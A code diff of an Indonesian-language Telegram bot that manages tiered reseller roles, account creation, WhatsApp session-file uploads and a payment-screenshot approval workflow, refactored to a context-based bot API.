       const file = await bot.getFile(msg.document.file_id);
-      const fileUrl = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;
+      const fileUrl = `https://api.telegram.org/file/bot${token}/${file.file_path}`;
       const buffer = await downloadToBuffer(fileUrl);
       const jsonData = JSON.parse(buffer.toString());
 
@@ -4870,7 +4453,6 @@ bot.on('message', async (msg) => {
         return bot.sendMessage(chatId, '❌ File tersebut bukan `creds.json` valid dari Baileys.');
       }
 
-      // Simpan ke folder sessions/<userId>/
       const userFolder = path.join(__dirname, 'permenmd');
       if (!fs.existsSync(userFolder)) {
         fs.mkdirSync(userFolder, { recursive: true });
@@ -4879,9 +4461,8 @@ bot.on('message', async (msg) => {
       let finalName = fileName;
       const savePath = path.join(userFolder, finalName);
 
-      // Jika file sudah ada, buat nama acak
       if (fs.existsSync(savePath)) {
-        const randomSuffix = Date.now(); // atau bisa juga pakai: Math.random().toString(36).slice(2, 8)
+        const randomSuffix = Date.now(); 
         const base = path.basename(fileName, '.json');
         finalName = `${base}-${randomSuffix}.json`;
       }
@@ -4897,641 +4478,397 @@ bot.on('message', async (msg) => {
   }
 });
 
-bot.on("callback_query", async (query) => {
-  const id = query.from.id;
-  const data = query.data;
-  
-  console.log('[CALLBACK] ===== START =====');
-  console.log('[CALLBACK] From ID:', id);
-  console.log('[CALLBACK] Data:', data);
-  
-  const config = loadTelegramConfig();
-  const isOwner = config.ownerList.includes(id);
-  const isPt = config.ptList && config.ptList.includes(id);
-  const isRes = config.resList && config.resList.includes(id);
-  const isTk = config.tkList && config.tkList.includes(id);
-  const isUser = config.userList.includes(id) || isOwner || isPt || isRes || isTk;
+bot.on('callback_query', async (ctx) => {
+    if (menuAnimation) {
+        clearInterval(menuAnimation);
+        menuAnimation = null;
+    }
 
-  if (!isUser) {
-    console.log('[CALLBACK] User tidak diizinkan:', id);
-    return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan." });
-  }
+    const userId = ctx.from.id;
+    const data = ctx.match[0];
+    await ctx.answerCbQuery();
 
-  console.log('[CALLBACK] Data yang diproses:', data);
+    const config = loadTelegramConfig();
+    const isDev = config.devList && config.devList.includes(userId);
+    const isOwner = config.ownerList && config.ownerList.includes(userId);
+    const isPt = config.ptList && config.ptList.includes(userId);
+    const isVip = config.vipList && config.vipList.includes(userId);
+    const isReseller = config.resellerList && config.resellerList.includes(userId);
+    const isFullup = config.fullupList && config.fullupList.includes(userId);
 
-  // ===== HANDLE STORAN APPROVE =====
-if (data && data.startsWith('storan_terima_')) {
-  console.log('[CALLBACK] MATCH: storan_terima');
-  const storanId = data.replace('storan_terima_', '');
-  console.log('[CALLBACK] storanId:', storanId);
-  await handleStoranApprove(id, storanId, "terima", query);
-  return;
-}
-
-if (data && data.startsWith('storan_tolak_')) {
-  console.log('[CALLBACK] MATCH: storan_tolak');
-  const storanId = data.replace('storan_tolak_', '');
-  console.log('[CALLBACK] storanId:', storanId);
-  await handleStoranApprove(id, storanId, "tolak", query);
-  return;
-}
-  
- if (data && data.startsWith('storan_qr_terima_')) {
-  console.log('[CALLBACK] MATCH: storan_qr_terima');
-  const qrId = data.replace('storan_qr_terima_', '');
-  console.log('[CALLBACK] qrId:', qrId);
-  await handleStoranQrApprove(id, qrId, "terima", query);
-  return;
-}
-
-if (data && data.startsWith('storan_qr_tolak_')) {
-  console.log('[CALLBACK] MATCH: storan_qr_tolak');
-  const qrId = data.replace('storan_qr_tolak_', '');
-  console.log('[CALLBACK] qrId:', qrId);
-  await handleStoranQrApprove(id, qrId, "tolak", query);
-  return;
-}
-
-  // ===== SWITCH CASE UNTUK YANG LAIN =====
-  switch (data) {
-    // ===== CREATE ACCOUNT =====
-    case "create_member":
-      createAccountByRole(id, "member");
-      break;
-    case "create_reseller":
-      if (!isRes && !isPt && !isTk && !isOwner) {
-        return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan membuat Reseller." });
-      }
-      createAccountByRole(id, "reseller");
-      break;
-    case "create_vip":
-      if (!isPt && !isTk && !isOwner) {
-        return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan membuat VIP." });
-      }
-      createAccountByRole(id, "vip");
-      break;
-    case "create_admin":
-      if (!isTk && !isOwner) {
-        return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan membuat Admin." });
-      }
-      createAccountByRole(id, "admin");
-      break;
-    case "create_owner":
-      if (!isTk && !isOwner) {
-        return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan membuat Owner." });
-      }
-      createAccountByRole(id, "owner");
-      break;
-
-    // ===== ADD ROLE VIA BUTTON =====
-    case "add_res":
-      if (!isPt && !isTk && !isOwner) {
-        return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan menambah Reseller." });
-      }
-      bot.sendMessage(id, `<blockquote>📨 Kirim ID Akun Tele Untuk Role RES (Reseller):\n\nContoh: 628123456789</blockquote>`, { parse_mode: "HTML" });
-      bot.once("message", msg => {
-        const targetId = parseInt(msg.text.trim());
-        if (isNaN(targetId)) {
-          return bot.sendMessage(id, `<blockquote>❌ ID tidak valid!.</blockquote>`, { parse_mode: "HTML" });
+    if (data === "back_start") {
+        try { await ctx.deleteMessage(); } catch (e) {}
+        let role = null;
+        if (isDev) role = 'developer';
+        else if (isOwner) role = 'owner';
+        else if (isPt) role = 'pt';
+        else if (isVip) role = 'vip';
+        else if (isReseller) role = 'reseller';
+        else if (isFullup) role = 'fullup';
+        else role = 'member';
+        const menuMessage = `<blockquote>👋 Halo ${ctx.from.first_name}, pilih menu:</blockquote>`;
+        const videoUrl = getRandomVidio();
+        const payload = {
+            caption: menuMessage,
+            parse_mode: "HTML",
+            reply_markup: getMainKeyboard(role)
+        };
+        if (ctx.chat.type === "private") {
+            payload.message_effect_id = menuEffects[Math.floor(Math.random() * menuEffects.length)];
         }
-        addRoleById(id, targetId, "res");
-      });
-      break;
+        const msg = await ctx.replyWithVideo(videoUrl, payload);
+        menuMsg = { chat_id: ctx.chat.id, message_id: msg.message_id, role: role };
+        menuAnimation = setInterval(async () => {
+            try {
+                await ctx.telegram.editMessageReplyMarkup(
+                    menuMsg.chat_id,
+                    menuMsg.message_id,
+                    null,
+                    getMainKeyboard(menuMsg.role)
+                );
+            } catch (err) {}
+        }, 3000);
+        return;
+    }
 
-    case "add_pt":
-      if (!isOwner && !isTk) {
-        return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan menambah Partner." });
-      }
-      bot.sendMessage(id, `<blockquote>📨 Kirim ID Akun Tele Untuk Role PT (Partner):\n\nContoh: 628123456789</blockquote>`, { parse_mode: "HTML" });
-      bot.once("message", msg => {
-        const targetId = parseInt(msg.text.trim());
-        if (isNaN(targetId)) {
-          return bot.sendMessage(id, `<blockquote>❌ ID tidak valid!.</blockquote>`, { parse_mode: "HTML" });
+    // STORAN APPROVE
+    if (data.startsWith('storan_terima_')) {
+        const storanId = data.replace('storan_terima_', '');
+        await handleStoranApprove(userId, storanId, "terima", ctx);
+        return;
+    }
+    if (data.startsWith('storan_tolak_')) {
+        const storanId = data.replace('storan_tolak_', '');
+        await handleStoranApprove(userId, storanId, "tolak", ctx);
+        return;
+    }
+    if (data.startsWith('storan_qr_terima_')) {
+        const qrId = data.replace('storan_qr_terima_', '');
+        await handleStoranQrApprove(userId, qrId, "terima", ctx);
+        return;
+    }
+    if (data.startsWith('storan_qr_tolak_')) {
+        const qrId = data.replace('storan_qr_tolak_', '');
+        await handleStoranQrApprove(userId, qrId, "tolak", ctx);
+        return;
+    }
+
+    // MENU BUTTONS
+    switch (data) {
+        case "create_member":
+            createAccountState[userId] = { role: "member", chatId: ctx.chat.id, step: "waiting_account_data" };
+            await ctx.replyWithHTML(`<blockquote>Masukkan data untuk akun MEMBER:\n\nFormat: username|password|durasi_hari</blockquote>`);
+            break;
+        case "create_reseller":
+            if (!isReseller && !isVip && !isPt && !isOwner && !isDev) {
+                return ctx.replyWithHTML(`<blockquote>❌ Tidak diizinkan membuat Reseller.</blockquote>`);
+            }
+            createAccountState[userId] = { role: "reseller", chatId: ctx.chat.id, step: "waiting_account_data" };
+            await ctx.replyWithHTML(`<blockquote>Masukkan data untuk akun RESELLER:\n\nFormat: username|password|durasi_hari</blockquote>`);
+            break;
+        case "create_vip":
+            if (!isVip && !isPt && !isOwner && !isDev) {
+                return ctx.replyWithHTML(`<blockquote>❌ Tidak diizinkan membuat VIP.</blockquote>`);
+            }
+            createAccountState[userId] = { role: "vip", chatId: ctx.chat.id, step: "waiting_account_data" };
+            await ctx.replyWithHTML(`<blockquote>Masukkan data untuk akun VIP:\n\nFormat: username|password|durasi_hari</blockquote>`);
+            break;
+        case "create_pt":
+            if (!isPt && !isOwner && !isDev) {
+                return ctx.replyWithHTML(`<blockquote>❌ Tidak diizinkan membuat PT.</blockquote>`);
+            }
+            createAccountState[userId] = { role: "pt", chatId: ctx.chat.id, step: "waiting_account_data" };
+            await ctx.replyWithHTML(`<blockquote>Masukkan data untuk akun PT:\n\nFormat: username|password|durasi_hari</blockquote>`);
+            break;
+        case "create_owner":
+            if (!isOwner && !isDev) {
+                return ctx.replyWithHTML(`<blockquote>❌ Tidak diizinkan membuat Owner.</blockquote>`);
+            }
+            createAccountState[userId] = { role: "owner", chatId: ctx.chat.id, step: "waiting_account_data" };
+            await ctx.replyWithHTML(`<blockquote>Masukkan data untuk akun OWNER:\n\nFormat: username|password|durasi_hari</blockquote>`);
+            break;
+        case "create_developer":
+            if (!isDev) {
+                return ctx.replyWithHTML(`<blockquote>❌ Hanya Developer yang bisa membuat Developer.</blockquote>`);
+            }
+            createAccountState[userId] = { role: "developer", chatId: ctx.chat.id, step: "waiting_account_data" };
+            await ctx.replyWithHTML(`<blockquote>Masukkan data untuk akun DEVELOPER:\n\nFormat: username|password|durasi_hari</blockquote>`);
+            break;
+        case "add_reseller":
+            if (!isReseller && !isVip && !isPt && !isOwner && !isDev) {
+                return ctx.replyWithHTML(`<blockquote>❌ Tidak diizinkan menambah Reseller.</blockquote>`);
+            }
+            addRoleState[userId] = { role: "reseller" };
+            await ctx.replyWithHTML(`<blockquote>📨 Kirim ID Akun Tele Untuk Role RESELLER:</blockquote>`);
+            break;
+        case "add_vip":
+            if (!isVip && !isPt && !isOwner && !isDev) {
+                return ctx.replyWithHTML(`<blockquote>❌ Tidak diizinkan menambah VIP.</blockquote>`);
+            }
+            addRoleState[userId] = { role: "vip" };
+            await ctx.replyWithHTML(`<blockquote>📨 Kirim ID Akun Tele Untuk Role VIP:</blockquote>`);
+            break;
+        case "add_pt":
+            if (!isPt && !isOwner && !isDev) {
+                return ctx.replyWithHTML(`<blockquote>❌ Tidak diizinkan menambah PT.</blockquote>`);
+            }
+            addRoleState[userId] = { role: "pt" };
+            await ctx.replyWithHTML(`<blockquote>📨 Kirim ID Akun Tele Untuk Role PT:</blockquote>`);
+            break;
+        case "add_owner":
+            if (!isOwner && !isDev) {
+                return ctx.replyWithHTML(`<blockquote>❌ Hanya OWNER atau DEVELOPER yang bisa menambah Owner.</blockquote>`);
+            }
+            addRoleState[userId] = { role: "owner" };
+            await ctx.replyWithHTML(`<blockquote>📨 Kirim ID Akun Tele Untuk Role OWNER:</blockquote>`);
+            break;
+        case "add_developer":
+            if (!isDev) {
+                return ctx.replyWithHTML(`<blockquote>❌ Hanya DEVELOPER yang bisa menambah Developer.</blockquote>`);
+            }
+            addRoleState[userId] = { role: "developer" };
+            await ctx.replyWithHTML(`<blockquote>📨 Kirim ID Akun Tele Untuk Role DEVELOPER:</blockquote>`);
+            break;
+        case "storan":
+            let storanButtons = [];
+            if (isDev) {
+                storanButtons = [
+                    [{ text: "👤 Storan Paket MEMBER", callback_data: "storan_member", style: "primary" }],
+                    [{ text: "📈 Storan Paket RESELLER", callback_data: "storan_reseller", style: "primary" }],
+                    [{ text: "⭐ Storan Paket VIP", callback_data: "storan_vip", style: "primary" }],
+                    [{ text: "💎 Storan Paket PT", callback_data: "storan_pt", style: "primary" }],
+                    [{ text: "👑 Storan Paket OWNER", callback_data: "storan_owner", style: "primary" }],
+                    [{ text: "👑 Storan Paket DEVELOPER", callback_data: "storan_developer", style: "success" }],
+                    [{ text: "❌ Batal", callback_data: "storan_batal", style: "danger" }]
+                ];
+            } else if (isOwner) {
+                storanButtons = [
+                    [{ text: "👤 Storan Paket MEMBER", callback_data: "storan_member", style: "primary" }],
+                    [{ text: "📈 Storan Paket RESELLER", callback_data: "storan_reseller", style: "primary" }],
+                    [{ text: "⭐ Storan Paket VIP", callback_data: "storan_vip", style: "primary" }],
+                    [{ text: "💎 Storan Paket PT", callback_data: "storan_pt", style: "primary" }],
+                    [{ text: "👑 Storan Paket OWNER", callback_data: "storan_owner", style: "primary" }],
+                    [{ text: "❌ Batal", callback_data: "storan_batal", style: "danger" }]
+                ];
+            } else if (isPt) {
+                storanButtons = [
+                    [{ text: "👤 Storan Paket MEMBER", callback_data: "storan_member", style: "primary" }],
+                    [{ text: "📈 Storan Paket RESELLER", callback_data: "storan_reseller", style: "primary" }],
+                    [{ text: "⭐ Storan Paket VIP", callback_data: "storan_vip", style: "primary" }],
+                    [{ text: "💎 Storan Paket PT", callback_data: "storan_pt", style: "primary" }],
+                    [{ text: "❌ Batal", callback_data: "storan_batal", style: "danger" }]
+                ];
+            } else if (isReseller) {
+                storanButtons = [
+                    [{ text: "👤 Storan Paket MEMBER", callback_data: "storan_member", style: "primary" }],
+                    [{ text: "⭐ Storan Paket VIP", callback_data: "storan_vip", style: "primary" }],
+                    [{ text: "📈 Storan Paket RESELLER", callback_data: "storan_reseller", style: "primary" }],
+                    [{ text: "❌ Batal", callback_data: "storan_batal", style: "danger" }]
+                ];
+            } else if (isVip) {
+                storanButtons = [
+                    [{ text: "👤 Storan Paket MEMBER", callback_data: "storan_member", style: "primary" }],
+                    [{ text: "⭐ Storan Paket VIP", callback_data: "storan_vip", style: "primary" }],
+                    [{ text: "❌ Batal", callback_data: "storan_batal", style: "danger" }]
+                ];
+            } else if (isFullup) {
+                storanButtons = [
+                    [{ text: "👤 Storan Paket MEMBER", callback_data: "storan_member", style: "primary" }],
+                    [{ text: "❌ Batal", callback_data: "storan_batal", style: "danger" }]
+                ];
+            } else {
+                storanButtons = [
+                    [{ text: "❌ Anda tidak memiliki akses Storan", callback_data: "storan_batal", style: "danger" }]
+                ];
+            }
+            await ctx.replyWithHTML(`<blockquote>📦 Pilih Paket Storan:</blockquote>`, {
+                parse_mode: "HTML",
+                reply_markup: { inline_keyboard: storanButtons }
+            });
+            break;
+        case "storan_member":
+        case "storan_reseller":
+        case "storan_vip":
+        case "storan_pt":
+        case "storan_owner":
+        case "storan_developer": {
+            const packageMap = {
+                storan_member: { key: "member", name: "MEMBER" },
+                storan_reseller: { key: "reseller", name: "RESELLER" },
+                storan_vip: { key: "vip", name: "VIP" },
+                storan_pt: { key: "pt", name: "PT" },
+                storan_owner: { key: "owner", name: "OWNER" },
+                storan_developer: { key: "developer", name: "DEVELOPER" }
+            };
+            const pkg = packageMap[data];
+            if (!pkg) break;
+            const storanData = loadStoranData();
+            storanData.pending.push({
+                id: generateStoranId(),
+                userId: userId,
+                package: pkg.key,
+                packageName: pkg.name,
+                step: "waiting_username",
+                username: null,
+                ssImage: null,
+                qrCode: null,
+                ssQrImage: null,
+                status: "pending"
+            });
+            saveStoranData(storanData);
+            await ctx.replyWithHTML(`<blockquote>📦 Storan Paket ${pkg.name}\n\nKirimkan ID Telegram yang mau di-stor:</blockquote>`);
+            break;
         }
-        addRoleById(id, targetId, "pt");
-      });
-      break;
+        case "storan_batal":
+            await ctx.replyWithHTML(`<blockquote>❌ Storan dibatalkan.</blockquote>`);
+            break;
+        case "list_user":
+            if (!isOwner && !isDev) {
+                return ctx.replyWithHTML(`<blockquote>❌ Tidak diizinkan.</blockquote>`);
+            }
+            const users = getFormattedUsers();
+            await ctx.replyWithHTML(`<blockquote>📋 Daftar Pengguna:\n${users}</blockquote>`);
+            break;
+        case "delete_user":
+            if (!isOwner && !isDev) {
+                return ctx.replyWithHTML(`<blockquote>❌ Tidak diizinkan.</blockquote>`);
+            }
+            deleteUserState[userId] = { step: "waiting_username" };
+            await ctx.replyWithHTML(`<blockquote>Masukkan username yang akan dihapus:</blockquote>`);
+            break;
+        case "set_expire":
+            setExpireState[userId] = { step: "waiting_data" };
+            await ctx.replyWithHTML(`<blockquote>Masukkan: username|tambah_hari</blockquote>`);
+            break;
+        case "list_command":
+            await ctx.replyWithHTML(`<blockquote>📋 LIST COMMAND\n\n/start - Menu Utama\n/info - Info User\n/addreseller - Add Reseller\n/addvip - Add VIP\n/addpt - Add PT\n/addowner - Add Owner\n/adddev - Add Developer\n/clear - Bersihkan Session\n/restart - Restart Server</blockquote>`);
+            break;
+        default:
+            await ctx.replyWithHTML(`<blockquote>❌ Fitur tidak dikenal.</blockquote>`);
+    }
 
-    case "add_owner":
-      if (!isOwner && !isTk) {
-        return bot.answerCallbackQuery(query.id, { text: "Hanya OWNER atau TK yang bisa menambah Owner." });
-      }
-      bot.sendMessage(id, `<blockquote>📨 Kirim ID Akun Tele Untuk Role OWNER:\n\nContoh: 628123456789</blockquote>`, { parse_mode: "HTML" });
-      bot.once("message", msg => {
-        const targetId = parseInt(msg.text.trim());
-        if (isNaN(targetId)) {
-          return bot.sendMessage(id, `<blockquote>❌ ID tidak valid!.</blockquote>`, { parse_mode: "HTML" });
-        }
-        addRoleById(id, targetId, "owner");
-      });
-      break;
-      
-    case "add_tk":
-      if (!isTk) {
-        return bot.answerCallbackQuery(query.id, { text: "Hanya TK yang bisa menambah TK." });
-      }
-      bot.sendMessage(id, `<blockquote>📨 Kirim ID Akun Tele Untuk Role TK:\n\nContoh: 628123456789</blockquote>`, { parse_mode: "HTML" });
-      bot.once("message", msg => {
-        const targetId = parseInt(msg.text.trim());
-        if (isNaN(targetId)) {
-          return bot.sendMessage(id, `<blockquote>❌ ID tidak valid!.</blockquote>`, { parse_mode: "HTML" });
-        }
-        addRoleById(id, targetId, "tk");
-      });
-      break;
-      
-    // ===== STORAN SYSTEM =====
-    case "storan":
-      if (!isOwner && !isPt && !isRes && !isTk) {
-        return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan." });
-      }
-      
-      let storanButtons = [];
-      
-      if (isRes && !isPt && !isTk && !isOwner) {
-        storanButtons = [
-          [{ text: "📦 Storan Paket MEMBER", callback_data: "storan_member" }],
-          [{ text: "📦 Storan Paket RES (Reseller)", callback_data: "storan_res" }],
-          [{ text: "❌ Batal", callback_data: "storan_batal" }]
-        ];
-      } else if (isPt && !isTk && !isOwner) {
-        storanButtons = [
-        [{ text: "📦 Storan Paket MEMBER", callback_data: "storan_member" }],
-          [{ text: "📦 Storan Paket RES (Reseller)", callback_data: "storan_res" }],
-          [{ text: "📦 Storan Paket PT (Partner)", callback_data: "storan_pt" }],
-          [{ text: "❌ Batal", callback_data: "storan_batal" }]
-        ];
-      } else if (isOwner && !isTk) {
-        storanButtons = [
-        [{ text: "📦 Storan Paket MEMBER", callback_data: "storan_member" }],
-          [{ text: "📦 Storan Paket RES (Reseller)", callback_data: "storan_res" }],
-          [{ text: "📦 Storan Paket PT (Partner)", callback_data: "storan_pt" }],
-          [{ text: "📦 Storan Paket OWNER", callback_data: "storan_owner" }],
-          [{ text: "❌ Batal", callback_data: "storan_batal" }]
-        ];
-      } else if (isTk) {
-        storanButtons = [
-        [{ text: "📦 Storan Paket MEMBER", callback_data: "storan_member" }],
-          [{ text: "📦 Storan Paket RES (Reseller)", callback_data: "storan_res" }],
-          [{ text: "📦 Storan Paket PT (Partner)", callback_data: "storan_pt" }],
-          [{ text: "📦 Storan Paket OWNER", callback_data: "storan_owner" }],
-          [{ text: "📦 Storan Paket TK", callback_data: "storan_tk" }],
-          [{ text: "❌ Batal", callback_data: "storan_batal" }]
-        ];
-      }
-      
-      const options = { reply_markup: { inline_keyboard: storanButtons } };
-      bot.sendMessage(id, `<blockquote>📦 Pilih Paket Storan:</blockquote>`, { ...options, parse_mode: "HTML" });
-      break;
-
-    case "storan_member":
-      const storanDataMember = loadStoranData();
-      const newStoranMember = {
-        id: generateStoranId(),
-        userId: id,
-        package: "member",
-        packageName: "MEMBER",
-        step: "waiting_username",
-        username: null,
-        ssImage: null,
-        qrCode: null,
-        ssQrImage: null,
-        status: "pending"
-      };
-      storanDataMember.pending.push(newStoranMember);
-      saveStoranData(storanDataMember);
-      bot.sendMessage(id, `<blockquote>📦 Storan Paket MEMBER\n\nKirimkan Id User yang mau di-stor:\n\nContoh: 1663207738</blockquote>`, { parse_mode: "HTML" });
-      break;
-
-    case "storan_res":
-    case "storan_pt":
-    case "storan_owner":
-    case "storan_tk":
-      const packageMap = {
-        storan_res: { key: "res", name: "RES (Reseller)" },
-        storan_pt: { key: "pt", name: "PT (Partner)" },
-        storan_owner: { key: "owner", name: "OWNER" },
-        storan_tk: { key: "tk", name: "TK" }
-      };
-      const pkg = packageMap[data];
-      if (!pkg) break;
-      
-      let allowed = false;
-      if (data === "storan_res" && (isRes || isPt || isOwner || isTk)) allowed = true;
-      else if (data === "storan_pt" && (isPt || isOwner || isTk)) allowed = true;
-      else if (data === "storan_owner" && (isOwner || isTk)) allowed = true;
-      else if (data === "storan_tk" && isTk) allowed = true;
-      
-      if (!allowed) {
-        return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan." });
-      }
-      
-      const storanData = loadStoranData();
-      const newStoran = {
-        id: generateStoranId(),
-        userId: id,
-        package: pkg.key,
-        packageName: pkg.name,
-        step: "waiting_username",
-        username: null,
-        ssImage: null,
-        qrCode: null,
-        ssQrImage: null,
-        status: "pending"
-      };
-      storanData.pending.push(newStoran);
-      saveStoranData(storanData);
-      bot.sendMessage(id, `<blockquote>📦 Storan Paket ${pkg.name}\n\nKirimkan Id User yang mau di-stor:\n\nContoh: 1663207738</blockquote>`, { parse_mode: "HTML" });
-      break;
-
-    case "storan_batal":
-      bot.sendMessage(id, `<blockquote>❌ Storan dibatalkan.</blockquote>`, { parse_mode: "HTML" });
-      break;
-
-    // ===== LIST & DELETE =====
-    case "list_user":
-      if (!isOwner && !isTk) return;
-      const users = getFormattedUsers();
-      bot.sendMessage(id, `<blockquote>📋 Daftar Pengguna:\n${users}</blockquote>`, { parse_mode: "HTML" });
-      break;
-
-    case "delete_user":
-      if (!isOwner && !isTk) return;
-      bot.sendMessage(id, `<blockquote>Masukkan username yang akan dihapus:</blockquote>`, { parse_mode: "HTML" });
-      bot.once("message", msg => {
-        const db = loadDatabase();
-        const index = db.findIndex(u => u.username === msg.text.trim());
-        if (index === -1) {
-          return bot.sendMessage(id, `<blockquote>❌ User tidak ditemukan.</blockquote>`, { parse_mode: "HTML" });
-        }
-        const deleted = db.splice(index, 1)[0];
-        saveDatabase(db);
-        bot.sendMessage(id, `<blockquote>🗑️ User ${deleted.username} berhasil dihapus.</blockquote>`, { parse_mode: "HTML" });
-      });
-      break;
-
-    case "set_expire":
-      bot.sendMessage(id, `<blockquote>Masukkan: username|tambah_hari</blockquote>`, { parse_mode: "HTML" });
-      bot.once("message", msg => {
-        const [username, addDays] = msg.text.split("|").map(s => s.trim());
-        const db = loadDatabase();
-        const user = db.find(u => u.username === username);
-        if (!user) {
-          return bot.sendMessage(id, `<blockquote>❌ User tidak ditemukan.</blockquote>`, { parse_mode: "HTML" });
-        }
-
-        if (!isOwner && !isTk && user.role !== "member") {
-          return bot.sendMessage(id, `<blockquote>❌ Kamu hanya bisa memperpanjang akun dengan role 'member'.</blockquote>`, { parse_mode: "HTML" });
-        }
-
-        const current = new Date(user.expiredDate);
-        current.setDate(current.getDate() + parseInt(addDays));
-        user.expiredDate = current.toISOString().split("T")[0];
-        saveDatabase(db);
-        bot.sendMessage(id, `<blockquote>✅ Masa aktif diperbarui untuk ${username} ke ${user.expiredDate}</blockquote>`, { parse_mode: "HTML" });
-      });
-      break;
-
-    default:
-      console.log('[CALLBACK] UNKNOWN DATA:', data);
-      bot.answerCallbackQuery(query.id, { text: "Fitur tidak dikenal." });
-      break;
-  }
-  
-  console.log('[CALLBACK] ===== END =====');
+    // Refresh menu
+    let role = null;
+    if (isDev) role = 'developer';
+    else if (isOwner) role = 'owner';
+    else if (isPt) role = 'pt';
+    else if (isVip) role = 'vip';
+    else if (isReseller) role = 'reseller';
+    else if (isFullup) role = 'fullup';
+    else role = 'member';
+    if (role && !data.startsWith('storan')) {
+        setTimeout(() => {
+            menuAnimation = setInterval(async () => {
+                try {
+                    await ctx.telegram.editMessageReplyMarkup(
+                        menuMsg.chat_id,
+                        menuMsg.message_id,
+                        null,
+                        getMainKeyboard(role)
+                    );
+                } catch (err) {}
+            }, 3000);
+        }, 1000);
+    }
 });
 
-// Fungsi untuk menambah role via button
-function addRoleById(chatId, targetId, roleType) {
-  const config = loadTelegramConfig();
-  const roleMap = {
-    res: { list: "resList", label: "RES (Reseller)" },
-    pt: { list: "ptList", label: "PT (Partner)" },
-    owner: { list: "ownerList", label: "OWNER" },
-    tk: { list: "tkList", label: "TK" }
-  };
-
-  const role = roleMap[roleType];
-  if (!role) {
-    return bot.sendMessage(chatId, `<blockquote>❌ Role tidak dikenal.</blockquote>`, { parse_mode: "HTML" });
-  }
-
-  const userExists = (list) => list && list.includes(targetId);
-  if (userExists(config[role.list])) {
-    return bot.sendMessage(chatId, `<blockquote>❌ User sudah memiliki role ${role.label}.</blockquote>`, { parse_mode: "HTML" });
-  }
-
-  if (!config[role.list]) config[role.list] = [];
-  config[role.list].push(targetId);
-  fs.writeFileSync(telegramDataPath, JSON.stringify(config, null, 2));
-
-  bot.sendMessage(chatId, `<blockquote>✅ Done Add\n\nUser ID: ${targetId}\nRole: ${role.label}</blockquote>`, { parse_mode: "HTML" });
-}
-
-// Fungsi helper untuk create account
-function createAccountByRole(chatId, roleName) {
-  bot.sendMessage(chatId, `<blockquote>Masukkan data untuk akun ${roleName.toUpperCase()}:\n\nFormat: username|password|durasi_hari\n\nContoh: senyap|123|9999</blockquote>`, { parse_mode: "HTML" });
-  
-  bot.once("message", msg => {
-    const text = msg.text || "";
-    const parts = text.split("|").map(s => s.trim());
-    
-    if (parts.length !== 3) {
-      return bot.sendMessage(chatId, `<blockquote>❌ Format salah!\nGunakan: username|password|durasi_hari\n\nContoh: senyap|123|9999</blockquote>`, { parse_mode: "HTML" });
-    }
-    
-    const [username, password, day] = parts;
-    const db = loadDatabase();
-    
-    if (db.find(u => u.username === username)) {
-      return bot.sendMessage(chatId, `<blockquote>❌ Username sudah ada!</blockquote>`, { parse_mode: "HTML" });
-    }
-    
-    const expired = new Date();
-    expired.setDate(expired.getDate() + parseInt(day));
-    db.push({ username, password, role: roleName, expiredDate: expired.toISOString().split("T")[0] });
-    saveDatabase(db);
-    
-    bot.sendMessage(chatId, `<blockquote>✅ Akun ${roleName.toUpperCase()} dibuat:\n👤 Username: ${username}\n🔐 Password: ${password}\n📅 Expired: ${expired.toISOString().split("T")[0]}</blockquote>`, { parse_mode: "HTML" });
-    console.log(`[TELEGRAM] Akun ${roleName} dibuat: ${username} | ${password} | ${expired.toISOString().split("T")[0]}`);
-  });
-}
-
-// ===== FUNGSI STORAN =====
-
+// ========== STORAN FUNCTIONS ==========
 function handleStoranUsername(chatId, userId, text) {
-  try {
     const storanData = loadStoranData();
     const pending = storanData.pending.find(s => s.userId === userId && s.step === "waiting_username");
     if (!pending) {
-      return bot.sendMessage(chatId, `<blockquote>❌ Tidak ada sesi storan aktif. Mulai dari /start</blockquote>`, { parse_mode: "HTML" });
+        return bot.telegram.sendMessage(chatId, `<blockquote>❌ Tidak ada sesi storan aktif.</blockquote>`, { parse_mode: "HTML" });
     }
-    
-    const targetId = text.trim();
-    pending.username = targetId;
+    pending.username = text.trim();
     pending.step = "waiting_ss";
     saveStoranData(storanData);
-    bot.sendMessage(chatId, `<blockquote>📸 Kirimkan Screenshot Bukti Trx Buyer (TRX):</blockquote>`, { parse_mode: "HTML" });
-  } catch (error) {
-    console.error('[ERROR] handleStoranUsername:', error.message);
-    bot.sendMessage(chatId, `<blockquote>❌ Terjadi kesalahan. Silakan coba lagi.</blockquote>`, { parse_mode: "HTML" });
-  }
+    bot.telegram.sendMessage(chatId, `<blockquote>📸 Kirimkan Screenshot Bukti Trx Buyer (TRX):</blockquote>`, { parse_mode: "HTML" });
 }
 
-function handleStoranSS(chatId, userId, photoId) {
-  const storanData = loadStoranData();
-  const pending = storanData.pending.find(s => s.userId === userId && s.step === "waiting_ss");
-  if (!pending) {
-    return bot.sendMessage(chatId, `<blockquote>❌ Tidak ada sesi storan aktif.</blockquote>`, { parse_mode: "HTML" });
-  }
-  pending.ssImage = photoId;
-  pending.step = "waiting_approve";
-  saveStoranData(storanData);
-  sendStoranToApprover(chatId, pending);
-  bot.sendMessage(chatId, `<blockquote>✅ Bukti TRX terkirim! Menunggu persetujuan Admin...</blockquote>`, { parse_mode: "HTML" });
-}
-
-function sendStoranToApprover(userChatId, pending) {
-  const config = loadTelegramConfig();
-  const approvers = [...(config.ownerList || []), ...(config.tkList || [])];
-  if (approvers.length === 0) {
-    return bot.sendMessage(userChatId, `<blockquote>❌ Tidak ada Admin yang tersedia.</blockquote>`, { parse_mode: "HTML" });
-  }
-  const caption = `<blockquote>📦 STORAN BARU\n\n🆔 ID: ${pending.id}\n👤 User: ${userChatId}\n📦 Paket: ${pending.packageName}\n👤 Username: ${pending.username}\n\n⏳ Menunggu persetujuan...</blockquote>`;
-  for (const approverId of approvers) {
-    bot.sendPhoto(approverId, pending.ssImage, {
-      caption: caption,
-      parse_mode: "HTML",
-      reply_markup: {
-        inline_keyboard: [[
-          { text: "✅ Terima", callback_data: `storan_terima_${pending.id}` },
-          { text: "❌ Tolak", callback_data: `storan_tolak_${pending.id}` }
-        ]]
-      }
-    });
